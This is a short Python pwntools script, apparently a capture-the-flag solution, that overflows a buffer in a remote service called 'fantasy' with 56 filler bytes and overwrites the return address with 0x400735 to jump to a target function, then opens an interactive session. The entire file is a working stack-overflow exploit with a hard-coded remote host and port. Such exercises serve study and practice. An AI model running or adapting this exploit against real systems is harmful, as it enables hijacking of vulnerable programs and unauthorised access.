#!/usr/bin/python
#__author__: TaQini
from pwn import *

# p = process('./fantasy')
p = remote('172.21.4.12',10101)
# context.log_level = 'debug'

len = 56

fantasy = 0x00400735
payload = 'A'*len+ p64(fantasy)

p.recvuntil('input your message\n')
# gdb.attach(p)
p.sendline(payload)

p.interactive()
